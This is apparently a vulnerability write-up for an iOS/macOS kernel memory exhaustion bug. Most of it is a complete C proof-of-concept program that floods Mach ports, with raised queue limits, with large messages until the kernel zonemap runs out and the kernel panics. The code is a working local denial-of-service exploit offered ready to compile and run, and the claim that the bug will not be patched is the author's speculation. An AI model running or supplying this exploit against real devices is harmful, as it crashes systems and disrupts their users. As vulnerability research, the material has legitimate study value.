# Kernel Memoryleak as result of zonemap exhaustion

This bug causes a kernel panic due to the the kernel zonemap being exhausted as result of a large number of messages with a very large body being sent to a machport.  
As machports have limits there is another feature in this logic that allows the attacker to raise the number of messages queued for a port resulting in a fast exhaustion of the zonemap.  
This issue mostlikely will not get patched because it is part of the design of the iOS kernel and therefore requires a lot of changes in the design.  
It is an example on why Apple Inc. stopped caring about kernel level denial of service vulnerabilities.  

```C
/*
 * Disclaimer: This code is mainly from Ian Beer and used in popular jailbreak solutions.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>

/* Taken from Ian Beer, this is to get the correct size for a specific kalloc zone but we don't actually need it in this usecase */
int message_size_for_kalloc_size(int kalloc_size) {
    return ((3*kalloc_size)/4) - 0x74;
}

/* Any call to this function will result in a kernel panic */
void exhaust_zonemap(void)
{
    /* We use the simplest mach message a port can get */
    struct simple_msg  {
        mach_msg_header_t hdr;
        char buf[0];
    };
    
    //Just a large number of iterations to speed things up, doesn't necessarily need to be the pagesize
    mach_vm_size_t pagesize = sysconf(_SC_PAGESIZE);
    //Craft a big message body so we can exhaust the zonemap.
    uint32_t bodysz = message_size_for_kalloc_size((int)pagesize) - sizeof(struct simple_msg);
    void* body = malloc(bodysz);
    memset(body, 'A', bodysz);
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + bodysz;
    struct simple_msg* msg = malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    memcpy(&msg->buf[0], body, bodysz);
    
    for(int  i = 0; i < pagesize; i++){
        mach_port_t q = MACH_PORT_NULL; //port we want to fill the queue of in the current iteration
        kern_return_t err = KERN_FAILURE;
        
        //Allocate the port to fill the queue of
        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
        if (err != KERN_SUCCESS) {
            printf(" [-] failed to allocate port\n");
            exit(EXIT_FAILURE);
        }
        
        //Raise the limits of the port so that we can send a lot of messages to the port
        mach_port_limits_t limits = {0};
        limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
        err = mach_port_set_attributes(mach_task_self(), q, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);
        if (err != KERN_SUCCESS) {
            printf(" [-] failed to increase queue limit\n");
            exit(EXIT_FAILURE);
        }
        

        //Lets start sending 256 messages with our body to the port and see the zonemap exhaust :)
        for (int i = 0; i < 256; i++) { // was MACH_PORT_QLIMIT_LARGE
            msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
            msg->hdr.msgh_size = msg_size;
            msg->hdr.msgh_remote_port = q;
            msg->hdr.msgh_local_port = MACH_PORT_NULL;
            msg->hdr.msgh_id = 0x41414141;
            
            err = mach_msg(&msg->hdr,
                           MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                           msg_size,
                           0,
                           MACH_PORT_NULL,
                           MACH_MSG_TIMEOUT_NONE,
                           MACH_PORT_NULL);
            
            if (err != KERN_SUCCESS) {
                printf(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
                exit(EXIT_FAILURE);
            }
        }
    }
    if(body) {
        free(body);
    }
    body = NULL;
}

int main(int argc, char* argv[])
{
    exhaust_zonemap();
    return 0;
}


  
```
